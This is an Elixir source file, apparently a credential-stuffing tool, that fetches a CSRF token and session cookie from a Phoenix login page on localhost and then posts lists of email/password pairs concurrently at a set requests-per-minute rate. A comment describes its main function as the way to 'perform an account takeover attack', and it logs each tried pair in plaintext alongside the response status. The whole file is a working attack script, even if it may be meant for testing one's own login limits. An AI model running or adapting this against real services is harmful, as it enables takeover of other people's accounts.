defmodule Envy do
  @url "http://localhost:4000/users/log_in"

  def get_csrf_and_cookie() do
    with {:ok, r} <- HTTPoison.get(@url),
         {:ok, html} <- Floki.parse_document(r.body),
         [{_, [_,_,{_v, csrf_token}], []}] <- Floki.find(html, "[name=_csrf_token")
    do
      cookie = get_cookie(r)
      %{cookie: cookie, csrf_token: csrf_token}
    else
      e ->
        IO.inspect(e)
        raise "Failed to get CSRF token and cookie"
    end
  end

  def get_cookie(response) do
    {_, cookie} =
      response.headers
      |> Enum.find(fn {x, _} -> x == "set-cookie" end)
    cookie
  end

  @headers [{"Content-Type", "application/x-www-form-urlencoded"}]

  def send_login(email, password) do
    cc = get_csrf_and_cookie()
    body = get_post_body(cc.csrf_token, email, password)
    tep = get_tep(email, password)
    case HTTPoison.post(@url, body, @headers, hackney: [cookie: [cc.cookie]]) do
      {:ok, r} ->
        tep <> " Login POST status #{r.status_code}\n"
      _ ->
        tep <> " Login POST failed\n"
    end
  end

  def get_post_body(csrf_token, email, password) do
    [user, domain] = String.split(email, "@")
    "_csrf_token=#{csrf_token}&user%5Bemail%5D=#{user}%40#{domain}&user%5Bpassword%5D=#{password}"
  end

  def get_tep(email, password) do
    "#{NaiveDateTime.local_now()} #{email}/#{password} "
  end

  # Convert requests per minute into milliseconds for Process.sleep()
  def convert_rpm(rpm) do
    (1000 * (60 / rpm)) |> trunc()
  end

  # The main function you call to perform an account takeover attack
  #
  # login_pairs is a list of lists, for example:
  # [["corvid@example.com", "corvidPass2022"], ...]
  #
  # rpm is the limit on how many http requests will be sent
  # in a 60 second period. Defaults to 500
  def ato(login_pairs, rpm \\ 500) do
    login_pairs
    |> do_ato(convert_rpm(rpm))
    |> Enum.map(&Task.await/1)
  end

  def do_ato([], _sleep), do: []
  def do_ato([[email, pass]|t], sleep_n) do
    Process.sleep(sleep_n)
    [Task.async(fn -> send_login(email, pass) end) | do_ato(t, sleep_n)]
  end
end
